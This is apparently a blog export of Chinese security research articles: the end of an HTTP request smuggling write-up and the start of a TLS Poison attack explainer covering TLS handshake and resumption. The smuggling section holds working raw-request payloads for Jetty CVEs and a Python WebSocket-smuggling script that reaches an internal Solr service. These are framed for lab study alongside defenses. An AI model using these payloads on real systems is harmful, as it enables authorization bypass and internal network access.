JettyJetty 有三个与 HTTP Smuggling 相关的 CVE： CVE-2017-7656 HTTP/0.9 issue ​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response. CVE-2017-7657 Chunk size attribute truncation ​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request. CVE-2017-7658 Double Content-Length ​ In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization. 对于 CVE-2017-7658 我们就不再探究了，因为之前也提过了，我们主要来看另外两个比较有意思的地方。 HTTP/0.9环境依旧可以使用我构建的 jetty lab 环境，然后我们用如下方式发送一个标准的 HTTP/0.9 请求： 1printf 'GET /?test=4564\\r\\n'|nc -q 1 127.0.0.1 8994 得到一个 400 响应： 1234567HTTP/1.1 400 HTTP/0.9 not supportedContent-Type: text/html;charset=iso-8859-1Content-Length: 65Connection: closeServer: Jetty(9.4.9.v20180320)&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt; 接着我们加上版本标识： 1printf 'GET /?test=4564 HTTP/0.9\\r\\n\\r\\n'|nc -q 1 127.0.0.1 8994 虽然这是 HTTP/0.9 不支持的格式，但是也会有意外的收获，得到一个 200 响应： 12345678&lt;head&gt;&lt;title&gt;Sample \"Hello, World\" Application&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=white&gt;&lt;table border=\"0\"&gt;&lt;tr&gt;... 这里的响应没有 headers ，只有 body ，也就是这个请求被 HTTP/0.9 进行了解析。 而且更有意思的是，添加上 HTTP/0.9 不支持的 headers 也会有意外的收获，这里我们添加一个提取响应包部分内容的 header： 123456printf 'GET /?test=4564 HTTP/0.9\\r\\n'\\'Range: bytes=36-42\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994, World 会发现 body 内容被我们进行了提取，结合我们上文提到的结合 HTTP Version 进行的 HTTP Response Splitting ，我们可以进行各种花式攻击 Chunk size attribute truncation我们利用以下代码发送请求： 123456789101112131415printf 'POST /?test=4973 HTTP/1.1\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Content-Type: application/x-www-form-urlencoded\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'100000000\\r\\n'\\'\\r\\n'\\'POST /?test=4974 HTTP/1.1\\r\\n'\\'Content-Length: 5\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994|grep \"HTTP/1.1\" 然后我们可以得到两个 200 响应可是按照 chunk 的标准，虽然第二个部分看起来是一个请求，但是实际上应该被算在 chunk data 当中，而问题就在这，jetty 返回了两个请求，把 100000000 当作了 0 ，也就是 chunk end 部分，所以就出现了两个请求的原因。 我们可以再进行一些尝试： 123456789101112131415161718printf 'POST /?test=4975 HTTP/1.1\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Content-Type: application/x-www-form-urlencoded\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'1ff00000008\\r\\n'\\'abcdefgh\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'POST /?test=4976 HTTP/1.1\\r\\n'\\'Content-Length: 5\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994|grep \"HTTP/1.1\" 这里我们依然得到了两个 200 响应，也就是第一个 chunk size 1ff00000008 被 jetty 截断成了 8 ，也就是 chunk data 部分只有abcdefgh，所以就返回了两个响应。 与 Apache CVE-2015-3183 类似，jetty 只会取 chunk size 的最后8个字节： 1234567ffffffffffff00000000\\r\\n ^^^^^^^^ 00000000 =&gt; size 01ff00000008\\r\\n ^^^^^^^^ 00000008 =&gt; size 8 Websocket其实这部分完全可以作为一个独立的部分，但是感觉篇幅有点长了，这里就做一下简单的介绍，在 Hackactivity 2019 上，@0ang3el 提出了与 Websocket 相关的攻击技术 What’s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs.，让我比较感兴趣的则是 Websocket Smuggling 的部分。 作者也把相关的描述放在了 websocket-smuggle 这里，这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理Sec-WebSocket-Version 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。 这里我们假设内网存在 solr 服务，外网无法访问，如果存在 websocket smuggling ，我们可以编写以下代码访问 solr 服务： 12345678910111213141516171819202122232425262728293031323334353637import socket req1 = \"\"\"GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1Host: ip:portSec-WebSocket-Version: 1338Upgrade: websocket\"\"\".replace('\\n', '\\r\\n')req2 = \"\"\"GET /solr/#/ HTTP/1.1Host: localhost:8983\"\"\".replace('\\n', '\\r\\n')def main(netloc): host, port = netloc.split(':') sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) # print req2 data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) sock.shutdown(socket.SHUT_RDWR) sock.close()if __name__ == \"__main__\": main('ip:port') 在今年红帽杯上也有使用这个攻击技术的一道 CTF 赛题，相关的 writeup 可以看看 Red Hat 2019 Web Write Up Golang这个是比较有意思的一个部分，当时是在10月初 fuzz 的，然后也找了挺久的目标，最后停留在了之前同学推荐的一个中间件 caddy 上（现在是 11月 27 日，竟然出 caddy 2 了…），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境 caddy。 于是就有了： 当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE 给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go 某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。 当时可开心了，赶紧噼里啪啦搜索如何给 Golang 提 issue ，结果后来仔细弄了一会，发现这个问题在 9月27日已经被提到了 net/http: invalid headers are normalized, allowing request smuggling，Golang 也在 1.13.1 版修复了该问题。//悔不当初应该提早看一看这方面的内容，错过一个 CVE /捂脸 然后我仔细看了本地 Golang 版本 1.8.x …然后 Caddy 的 issue 邮件回复也到了…不出所料让我升级 Golang 到 1.13.1，看了一眼 dockerhub 上的 caddy 我吐了 但是目前(11/27) dockerhub 上的 caddy 环境仍然还是有这个问题的，使用需谨慎！ Something Elsehackerone 上已经有相关漏洞的披露了，这里推荐几篇挖洞实战的文章： Write up of two HTTP Requests Smuggling HTTP Request Smuggling (CL.TE) HTTP Request Smuggling on vpn.lob.com Defence ​ 从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。 禁用代理服务器与后端服务器之间的TCP连接重用。 使用HTTP/2协议。 前后端使用相同的服务器。 以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。 然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过: Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests. 之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。 具体可以参考 HTTP/2 简介 Bonus经过这段时间的学习研究，自己也将一些相关的实验整理成了 docker 环境，方便大家复现学习：HTTP-Smuggling-Lab 现在环境不多，欢迎 star，后面我会继续加入更多的环境方便大家以白盒的形式去理解学习，如果我有时间的话 ReferencesRFC7230 HTTP Desync Attacks: Request Smuggling Reborn HTTP request smuggling regilero’s blog 协议层的攻击——HTTP请求走私 http request smuggling, cause by obfuscating TE header Multiple HTTP Smuggling reports HTTP/2: the difference between HTTP/1.1, benefits and how to use it","link":"/2019/12/05/HTTP-Smuggling/"},{"title":"一篇文章带你读懂 TLS Poison 攻击","text":"这是《一篇文章带你读懂 XXX 攻击》系列的第二篇文章，本篇文章主要讲述 TLS Poison 攻击对应的三种攻击方式、一些可能算是“新”的 DNS Rebinding 技巧以及一些关于 IP 选择探索等内容。 文章首发于雷神众测，分为系列文章： 一篇文章带你读懂 TLS Poison 攻击（一）https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg 一篇文章带你读懂 TLS Poison 攻击（二）https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ 一篇文章带你读懂 TLS Poison 攻击（三）https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg 一篇文章带你读懂 TLS Poison 攻击（四）https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA [TOC] Preface使用《一篇文章带你读懂 XXX 攻击》的标题是为了督促自己把一个攻击的尽可能多的细节尽可能的搞懂，也是为了提升自己的写作以及表述水平。本文旨在帮助大家了解学习 TLS Poison 攻击，希望通过一篇文章让大家读懂 TLS Poison 攻击，但是仅仅网络协议涉及到很多内容，靠本文是不可能完全读懂的，本文的内容也并非完全正确，所以也希望大家抱着怀疑的态度合理对文章提出质疑。 本文主要是对 Black Hat USA 2020 - When TLS Hacks You 议题的整理与复盘，该攻击是一种利用 TLS 协议特性结合客户端实现缺陷达到攻击内网应用的攻击方式，可以达到任意写入 Memcached 等内网服务的攻击效果，进而配合其他漏洞造成 RCE 等危害。 这是去年的在 black hat USA 提出的一项攻击方式，但是作者在提出这个攻击方式后，由于种种因素，他放出来的 demo 并不能直接使用，所以在对该项的研究复现中整理了很多攻击细节，以及一些可以拓展的地方，还有一些关于计算机科学知识的探索。 本文主要分成三部分，第一部分主要简单讲述一些必要的背景知识，第二部分会详细记录三种攻击方式的实现步骤，第三部分会讲述一些关于在复现过程中的一些思考以及相关探索的内容。如果还有后续的进展，我也会同步到自己的个人博客上，欢迎关注，以及前来交流：https://blog.zeddyu.info/ 如果对该篇文章有任何疑问或者质疑，欢迎来信：echo emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d 欢迎对协议安全等内容感兴趣的同学一起交流学习！ PS: 如无特殊说明，整个实验背景均基于 Ubuntu 20.04 LTS ，curl 7.68.0 build with OpenSSL/1.1.1f ，后文提到的 IPv6 均指的是 IPv4-mapped IPv6 addresses 这类地址 BackgroundTLS Overview传输层安全性协议（英语：Transport Layer Security，缩写：TLS）及其前身安全套接层（英语：Secure Sockets Layer，缩写：SSL）是一种安全协议，目的是为互联网通信提供安全及数据完整性保障。网景公司（Netscape）在1994年推出首版网页浏览器－网景导航者时，推出HTTPS协议，以SSL进行加密，这是SSL的起源。IETF将SSL进行标准化，1999年公布TLS 1.0标准文件（RFC 2246）。随后又公布TLS 1.1（RFC 4346，2006年）、TLS 1.2（RFC 5246，2008年）和TLS 1.3（RFC 8446，2018年）。在浏览器、电子邮件、即时通信、VoIP、网络传真等应用程序中，广泛使用这个协议。许多网站，如Google、Facebook 等也以这个协议来创建安全连线，发送资料。目前已成为互联网上保密通信的工业标准。 Netscape 开发了名为安全套接字层（Secure Socket Layer，SSL）的上一代加密协议，TLS 由此演变而来。TLS 1.0 版的开发实际上始于 SSL 3.1 版，但协议的名称在发布之前进行了更名，以表明它不再与 Netscape 关联。由于这个历史原因，TLS 和 SSL 这两个术语有时会互换使用。 该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。 因为本文侧重点并非 TLS 本身的加密算法流程，所以会忽略很多密码算法流程，只提其中对我们后续攻击相关的部分，密码算法部分感兴趣的读者可以自行搜索了解。 TLS HandshakeTLS 握手是启动使用 TLS 加密的通信会话的过程。在 TLS 握手期间，两个通信方交换消息以相互确认，彼此验证，确立它们将使用的加密算法，并就会话密钥达成共识。它定义了消息的格式和交换的顺序。这些可以根据客户端和服务器的需求而变化，也就是说，有几种可能的程序来建立连接。初始交换的结果是TLS连接成功（双方都准备好用TLS传输应用数据）或发出警报消息。 每当用户通过 HTTPS 导航到网站，并且浏览器首先开始查询网站的源站服务器时，都会进行 TLS 握手。每当其他任何通信使用 HTTPS（包括 API 调用和 HTTPS 上的 DNS 查询）时，也会发生 TLS 握手。通过 TCP 握手打开 TCP 连接后，将发生 TLS 握手。 在 TLS 握手过程中，客户端和服务器一同执行以下操作： 指定将要使用的 TLS 版本（TLS 1.0、1.2、1.3 等） 决定将要使用哪些密码套件 通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份 生成会话密钥，以在握手完成后使用对称加密 检查是否需要恢复会话 TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。 TLS 握手的确切步骤将根据所使用的密钥交换算法的类型以及双方支持的密码套件而有所不同，RSA 密钥交换算法最为常用。但是并非所有 TLS 握手均使用非对称加密（公钥和私钥），但并非全都会在生成会话密钥的过程中使用私钥。例如 Diffie-Hellman 握手等，这里不做过多介绍。 TLS RecordTLS Record 协议使用握手过程中创建的密钥来确保应用数据的安全。记录协议负责保护应用数据的安全，并验证其完整性和来源。它管理以下内容：将传出的消息分为可管理的块、重新组合传入的消息、压缩外发报文块和解压接收报文块（可选）、将信息验证码（Message Authentication Code, MAC）应用到外发信息并使用 MAC 验证接收信息、加密外发报文和解密接收报文。当 TLS Record 协议完成后，外发加密数据被传到传输控制协议（TCP）层进行传输。 TLS 1.2TLS 1.2 HankShake由于历史原因，TLS 的前身 SSL 已经被废弃；现行趋势中，主流 TLS 版本为 1.2 ，并且 1.2 对于 1.1 的改动相对于本文重点来说并不重要，并且现在处于推广 1.3 的时代，我们这里从 TLS 1.2 开始讲起。 Client hello: 客户端发送 ClientHello 消息，指定它支持的最高 TLS 协议版本、一个随机数、一个建议的密码套件列表和建议的压缩方法。如果客户端试图执行恢复握手，它可能会发送一个会话 ID 。如果客户端可以使用应用层协议协商，它可能包括一个支持的应用协议列表，例如 HTTP/2 。 Server hello: 服务器以 ServerHello 消息作出响应，包含从客户端提供的选择中选择的协议版本、随机数、密码套件和压缩方法。为了确认或允许恢复握手，服务器可以发送一个会话 ID 。选择的协议版本应该是客户端和服务器都支持的最高版本。例如，如果客户端支持 TLS 1.1 版本，服务器支持 1.2 版本，则应选择 1.1 版本；不应选择 1.2 版本。 (Optional) Certificate: 服务器向客户端发送证书或证书链。 证书链通常以服务器的公钥证书开始，并以证书颁发机构的根证书结束。 该消息是可选的，但是在需要服务器身份验证时使用。 (Optional) Certificate request: 如果服务器必须对客户端进行身份验证，则它将向客户端发送证书请求。 在Internet应用程序中，很少发送此消息。 (Optional) Server key exchange: 如果来自证书的公钥信息不足以进行密钥交换，则服务器会向客户端发送服务器密钥交换消息。 例如，在基于Diffie-Hellman（DH）的密码套件中，此消息包含服务器的DH公钥。 Server hello done: 服务器告诉客户端它已经完成了其初始协商消息。 (Optional)Certificate: 如果服务器从客户端请求证书，则客户端将发送其证书链，就像服务器之前所做的一样。 Note: 只有少数Internet服务器应用程序要求客户端提供证书。 Client key exchange: 客户端生成用于创建用于对称加密的密钥的信息。 对于 RSA ，客户端随后使用服务器的公共密钥对该密钥信息进行加密并将其发送到服务器。 对于基于 DH 的密码套件，此消息包含客户端的 DH 公钥。 (Optional) Certificate verify: 如前所述，当客户端出示证书时，此消息由客户端发送。 其目的是允许服务器完成对客户端进行身份验证的过程。 使用此消息时，客户端使用加密哈希函数发送其进行数字签名的信息。 当服务器使用客户端的公共密钥解密此信息时，服务器便能够对客户端进行身份验证。 Change cipher spec: 客户端发送一条消息，告知服务器更改为加密模式。 Finished: 客户端告诉服务器已准备好开始安全数据通信。 Change cipher spec: 服务器发送一条消息，告知客户端更改为加密模式。 Finished: 服务器告诉客户端它已准备好开始安全数据通信，握手到此结束。 Encrypted data: 客户端和服务器使用对称加密算法和在客户端问候和服务器问候期间协商的加密哈希函数，以及使用客户端在客户端密钥交换期间发送给服务器的秘密密钥进行通信。 此时可以重新协商握手。 Close Messages: 在连接结束时，双方都会发送 close_notify Alert 报文，以通知对等方该连接已关闭。 大致流程如下图所示 对于不同的密钥算法又会产生稍微不一致的流程，这里并不作为重点，所以我们就不再展开描述了。 TLS 1.2 Session Resumption Overview完整的 TLS 握手产生的额外延时和计算成本对所有需要安全通信的应用程序牺牲了很多性能代价，为了帮助降低部分成本， TLS 提供了一种机制恢复会话机制，用来恢复或共享多个连接之间的相同协商的秘钥数据。会话恢复是一个重要的优化部署，简略的握手消除了一个完整的 TLS 握手往返耗时，大大降低了双方的计算成本。在 TLS 1.2 中， TLS Session Resumption 可以采用 Session ID 和会话票机制来实现。除了性能上的优势外，恢复的会话还可以用于单点登录，因为它保证了原始会话和任何恢复的会话都来自同一个客户端。 TLS 1.2 Session Resumption - Session ID在这种机制中，服务器在与客户端初次握手时，服务器会随机分配一个 Session ID。客户端和服务器将这个会话ID与会话密钥和连接状态一起存储。为了恢复会话，客户端将存储的会话ID与第一个协议消息（ClientHello）一起发送给服务器。如果服务器识别到了连接并愿意恢复会话，它就会用相同的会话ID来回复，重新建立各自的会话。这样就可以快速建立安全的连接，而且由于我们重用了之前协商好的会话数据，所以不会损失安全性。 Client 在一开始发送 ClientHello 消息中， ClientHello 消息中包括一个可变长度的 Session ID。如果为空则表示是一个新的会话，也就是客户端与服务端第一次握手，Server 在返回 ServerHello 时就会发送一个 Session ID ，此时内容为 Server 产生，当协商握手完成后，Session ID 就变得有效，并一直存在，直到由于超过有效时间或因为在与会话相关的连接上遇到服务器错误而被删除。如果不为空，该值就表示客户端希望重用该会话的安全参数，Server 会检查它的会话缓存以进行匹配，如果匹配成功，并且 Server 愿意在指定的会话状态下重建连接，它将会发送一个带有相同会话 ID 值的 ServerHello 消息，这时 Client 和 Server 必须都发送 ChangeCipherSpec 消息并且直接发送 Finished 消息，一旦重建立完成，Client 和 Server 可以开始交换应用层数据。如果一个会话 ID 不匹配，Server 会产生一个新的会话 ID，然后 TLS Client 和 Server 需要进行一次完整的握手。 1234567891011Client ServerClientHello --------&gt; ServerHello [ChangeCipherSpec] &lt;-------- Finished[ChangeCipherSpec]Finished --------&gt;Application Data &lt;-------&gt; Application Data Figure 2. Message flow for an abbreviated handshake 在 RFC 5246 中，对 SessionID 做出了规定，其长度为 0-32 位： 1opaque SessionID&lt;0..32&gt;; 同时 RFC 建议 Session ID的寿命上限为24小时，因为获得master_secret的攻击者可能会冒充被入侵的一方，直到相应的 Session ID 失效。 整个重用过程我们可以从下图比较直观的看到： 客户端首先发送了一个 Client Hello 消息给服务端，并且其 Session ID 为空，这时候 Server 响应了 Server Hello 当中就会返回一个 32 字节长度的 Session ID。现在客户端和服务器的 TLS 会话缓存中都存储了 Session ID，其值为 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433。这样做的好处就是，在下一次TLS连接请求中，客户端不需要再经历完整的TLS握手。 客户端只需在其 Client Hello 消息中发送之前从 Server 那里得知的 Session ID ，然后 Server 确认这个 Session ID 在它的 TLS 会话缓存之后，它们就会进行所谓的 Abbreviated TLS Handshake 。在这次 TLS 握手过程中不会交换证书或密钥信息，之前协商好的密钥会被重新使用，这样就完成了一次 TLS Session Resumption 。 TLS 1.2 Session Resumption - Session Ticket然而，Session ID 机制的一个实际限制是要求服务器为每个客户端创建和维护一个会话缓存。这就导致了服务器上的几个问题，每天可能会有成千上万甚至上百万个独特的连接；每一个打开的TLS连接都会消耗内存，需要 Session ID 缓存和删除策略，以及对于有许多服务器的热门网站的部署挑战，理想情况下，这些网站应该使用共享的 TLS Session 缓存以获得最佳性能。因此，对于任何多服务器的部署，Session ID 都需要一些仔细的思考和系统架构，以确保会话缓存的良好运行。 为了解决服务器端部署 TLS 会话缓存的这一问题，引入了 Session Ticket (RFC 5077)替换机制，它取消了服务器保留每个客户端会话状态的要求。取而代之的是，如果客户端表示支持会话票，服务器可以包含一个会话票记录，其中包括所有用只有服务器知道的秘密密钥加密的协商会话数据。然后，该会话票由客户端存储，并且可以包含在后续会话的握手消息中。因此，所有的会话数据只存储在客户端，但票据仍然是安全的，因为它是用只有服务器知道的密钥加密的。 会话票机制被称为无状态恢复机制。无状态恢复机制的主要改进是取消了服务器端的会话缓存，简化了部署，要求客户端在每次与服务器的新连接时提供会话票据，直到票据过期。 TLS SessionTicket 是一个扩展，其基于 RFC4366 。Ticket 的格式是一个 opaque 的结构，用于携带特定会话的状态信息。RFC 推荐的 Session Ticket 结构如下： 1234567891011struct { uint32 ticket_lifetime_hint; opaque ticket&lt;0..2^16-1&gt;;} NewSessionTicket;struct { opaque key_name[16]; opaque iv[16]; opaque encrypted_state&lt;0..2^16-1&gt;; opaque mac[32];} ticket; 这个扩展可以在 ClientHello 和 ServerHello 中发送。如果客户端拥有一个想要用来恢复会话的 ticket，那么它就会在 ClientHello 中的 SessionTicket 扩展中包含这个 ticket。如果客户端没有票据，并且准备在 NewSessionTicket 握手消息中接收票据，那么它必须在 SessionTicket 扩展中包含一个长度为零的 Session Ticket 。如果客户端不准备在 NewSessionTicket 握手消息中接收票据，则必须不包含 SessionTicket 扩展，除非客户端发送通过其他方式从服务器收到的非空票据。 123456789101112131415161718192021 Client Server ClientHello (empty SessionTicket extension)--------&gt; ServerHello (empty SessionTicket extension) Certificate* ServerKeyExchange* CertificateRequest* &lt;-------- ServerHelloDone Certificate* ClientKeyExchange CertificateVerify* [ChangeCipherSpec] Finished --------&gt; NewSessionTicket [ChangeCipherSpec] &lt;-------- Finished Application Data &lt;-------&gt; Application DataFigure 1: Message Flow for Full Handshake Issuing New Session Ticket 如上流程图所示，客户端通过在 ClientHello 消息中包含一个 SessionTicket TLS 扩展名来表示它支持这种机制，此时 SessionTicket 为空，服务器将发送一个空的SessionTicket 扩展来表示它将使用 NewSessionTicket 握手消息发送一个新的 Session Ticket，该消息是在服务器成功验证客户端的 Finished 消息后，在ChangeCipherSpec 消息之前的 TLS 握手期间发送。在得到 Session Ticket 后，Client 将该 Session Ticket 与主密和其他与当前会话相关的参数一起缓存。 1234567891011121314 Client Server ClientHello (SessionTicket extension) --------&gt; ServerHello (empty SessionTicket extension) NewSessionTicket [ChangeCipherSpec] &lt;-------- Finished [ChangeCipherSpec] Finished --------&gt; Application Data &lt;-------&gt; Application DataFigure 2: Message Flow for Abbreviated Handshake Using New Session Ticket 当客户端希望恢复会话时，它在 ClientHello 消息中的 SessionTicket 扩展中包含该票据。然后服务器对收到的票据进行解密，验证票据的有效性，从票据的内容中检索会话状态，并使用这个状态来恢复会话。如果服务器成功验证了客户端的票据，那么就可以在 ServerHello 之后加入 NewSessionTicket 握手消息来续订票据。 我们可以通过实例来进一步了解这个机制： 客户端首先通过在 Client Hello 消息中添加 SessionTickets TLS Extension 来表明它支持无状态会话恢复（绿色部分）， Server 还会通过发送包含有空的 SessionTicket TLS Extension 的 Server Hello 消息给 Client ，表示 Server 支持 SessionTicket TLS Extension（红色部分）。 在握手完成之前，也就是 Finished 之前，Server 会发送一个名为 New Session Ticket 的新 TLS 消息，其中包含加密的会话信息（如主密、使用的密码等），Server 可以在稍后使用它专门为此生成的唯一密钥进行解密。从这一点开始，Client 会将 Session Ticket 保存在它的 TLS 缓存中，直到下一次它在 Session Ticket过期之前都可以使用它与之前的 Server 恢复 TLS 会话。 现在，当 Client 想要重新使用之前的会话时，它在 Client Hello 消息的 SessionTicket TLS Extension 中发送了 Session Ticket，此时我们所注意到，客户端也创建了一个新的会话 ID ，用于以下目的： 服务器回复相同的 Session ID 表示 Server 接受 Session Ticket ，并将重用该 Session 。 服务器回复空的/不同的 Session ID ：Server 决定进行完全握手，原因是可能是 Session Ticket 过期了，或者它正在恢复原来的会话。PS：这样的 Session ID 并不存储在 Server 上，否则会破坏无状态会话重用的目的。这是一次性使用，只是为了向 Client 表示 Server 接受了他们发送的session ticket。 在上述的例子中，Server 成功接受并重用了 TLS 会话，我们可以确认进行了一个 Abbreviated TLS 握手，并且在服务器的 Server Hello 消息中，Server 回复了客户端发送的相同 Session ID 。这就是一个简单的基于 Session Ticket 机制的 Session Resumption ，服务端不需要在本地存储会话信息，因此与有状态的会话恢复相比，它是一个更具扩展性的选择。 TLS 1.3TLS 1.3 OverviewTLS 1.3 可以说是 TLS 1.2 的升级版本，它在 RFC 8446 中定义，于 2018 年 8 月发表。我们这里简要的介绍几个我们比较关心的改动： 减少握手等待时间，将握手时间从 2-RTT 降低到 1-RTT，并且增加 0-RTT 模式。 废除 Session ID 和 Session Ticket 会话恢复方式，统一通过 PSK 的方式进行会话恢复，并在 NewSessionTicket 消息中添加过期时间和用于混淆时间的偏移值。 在握手时相对于 TLS 1.2 发生了比较明显的改动： 与 TLS 1.2 握手类似，TLS 1.3 握手以 Client Hello 消息开始，但有一个重要的变化就是客户端发送支持的加密套件列表，并猜测服务器可能选择的密钥协议协议，也会发送它对该特定密钥协议协议的密钥共享。 Server 在回复 Server Hello 时，服务器回复它所选择的密钥协议协议，其中也包括服务器的密钥共享、证书以及 Server Finished 。 现在，客户端检查服务器证书，生成密钥，并发送 Client Finished ，之后就可以发送加密数据了。 这样一来，TLS 1.3 握手就节省了整整一个来回和数百毫秒的时间，比 TLS 1.2 握手有了很大的改进。RFC 8446 提供的简要流程图如下： 12345678910111213141516171819202122232425262728293031323334 Client ServerKey ^ ClientHelloExch | + key_share* | + signature_algorithms* | + psk_key_exchange_modes* v + pre_shared_key* --------&gt; ServerHello ^ Key + key_share* | Exch + pre_shared_key* v {EncryptedExtensions} ^ Server {CertificateRequest*} v Params {Certificate*} ^ {CertificateVerify*} | Auth {Finished} v &lt;-------- [Application Data*] ^ {Certificate*}Auth | {CertificateVerify*} v {Finished} --------&gt; [Application Data] &lt;-------&gt; [Application Data] + Indicates noteworthy extensions sent in the previously noted message. * Indicates optional or situation-dependent messages/extensions that are not always sent. {} Indicates messages protected using keys derived from a [sender]_handshake_traffic_secret. [] Indicates messages protected using keys derived from [sender]_application_traffic_secret_N. Figure 1: Message Flow for Full TLS Handshake TLS 1.2 与 1.3 简要的握手对比如下图所示： TLS 1.3 Session Resumption - PSK按照上文所说，TLS 1.3 用通过预共享密钥（Pre-Shared Key, PSK）恢复会话的概念取代了 1.2 当中的 Session ID 和 Session Ticket 。在最初的握手之后，服务器向客户端发送一个 PSK 标识。 PSK 内容取决于服务器，可能包含一个数据库查询密钥或一个自我加密和自我认证的票据。客户端将此PSK身份与自己的会话密钥一起存储。其中， RFC 8446 定义的 PSK 结构如下所示： 123456789101112131415161718struct { opaque identity&lt;1..2^16-1&gt;; uint32 obfuscated_ticket_age;} PskIdentity;opaque PskBinderEntry&lt;32..255&gt;;struct { PskIdentity identities&lt;7..2^16-1&gt;; PskBinderEntry binders&lt;33..2^16-1&gt;;} OfferedPsks;struct { select (Handshake.msg_type) { case client_hello: OfferedPsks; case server_hello: uint16 selected_identity; };} PreSharedKeyExtension; 在随后的握手中，客户端在给服务器的 ClientHello 消息中提供这个 PSK ，服务器根据 PSK 的内容对票据进行解密，并使用包含的会话密钥和连接状态来恢复会话，或者服务器使用包含的查找密钥在自己的数据库中查找会话密钥和连接状态。 RFC 8446 提供了一个 Session Resumption 的流程图如下： 12345678910111213141516171819202122232425262728293031323334 Client ServerInitial Handshake: ClientHello + key_share --------&gt; ServerHello + key_share {EncryptedExtensions} {CertificateRequest*} {Certificate*} {CertificateVerify*} {Finished} &lt;-------- [Application Data*] {Certificate*} {CertificateVerify*} {Finished} --------&gt; &lt;-------- [NewSessionTicket] [Application Data] &lt;-------&gt; [Application Data]Subsequent Handshake: ClientHello + key_share* + pre_shared_key --------&gt; ServerHello + pre_shared_key + key_share* {EncryptedExtensions} {Finished} &lt;-------- [Application Data*] {Finished} --------&gt; [Application Data] &lt;-------&gt; [Application Data] Figure 3: Message Flow for Resumption and PSK 客户端向服务器发送一个带有 key_share 扩展的 ClientHello 消息。该扩展列出了客户端支持的密钥交换加密方法。 服务器用一个带有 key_share 扩展名的 ServerHello 